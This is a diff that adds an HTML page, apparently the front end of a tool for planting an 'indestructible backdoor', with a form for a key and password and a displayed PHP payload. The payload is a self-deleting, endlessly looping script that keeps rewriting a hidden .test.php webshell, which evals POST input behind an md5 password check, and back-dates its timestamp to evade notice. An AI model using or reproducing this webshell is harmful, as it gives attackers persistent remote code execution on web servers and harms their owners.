@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Document</title>
+    </head>
+    <body>
+        <form id="uploadIndestructibleBackdoor">
+            <label for="key">key: </label>
+            <input type="text" name="key" id="key" required />
+            <br />
+            <label for="password">password: </label>
+            <input type="text" name="password" id="password" required />
+            <br />
+            <button type="submit" id="">确定</button>
+        </form>
+        <div>
+            <div>
+                <pre>
+                    <code>
+&lt;?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = &#x27;.test.php&#x27;;
+$code = &#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==<mark>password</mark>){@eval($_POST[<mark>key</mark>]);} ?&gt;&#x27;;
+while (1){
+    file_put_contents($file,$code);
+    system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .test.php&#x27;);
+    usleep(5000);
+}
+                    </code>
+                </pre>
+            </div>
+        </div>
+        <script src="uploadBackdoor.js" type="module"></script>
+    </body>
+</html>
